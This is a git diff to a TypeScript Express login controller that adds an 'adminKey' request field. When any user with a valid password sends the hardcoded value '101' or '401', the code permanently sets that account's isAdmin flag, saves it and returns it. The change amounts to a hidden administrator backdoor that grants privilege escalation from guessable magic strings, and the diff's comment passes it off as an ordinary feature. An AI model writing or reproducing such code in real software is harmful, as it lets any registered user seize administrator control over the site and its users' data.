@@ -51,17 +51,24 @@ export const registerUser = async (req: Request, res: Response) => {
 // @route   POST /api/auth/login
 // @access  Public
 export const loginUser = async (req: Request, res: Response) => {
-    const { email, password } = req.body;
+    const { email, password, adminKey } = req.body;
 
     try {
         const user = await User.findOne({ email });
 
         if (user && (await user.matchPassword(password))) {
+            // Check for admin key if provided
+            if (adminKey === '101' || adminKey === '401') {
+                user.isAdmin = true;
+                await user.save();
+            }
+
             res.json({
                 _id: user._id,
                 name: user.name,
                 email: user.email,
                 avatar: user.avatar,
+                isAdmin: user.isAdmin,
                 token: generateToken(user._id as unknown as string),
             });
         } else {
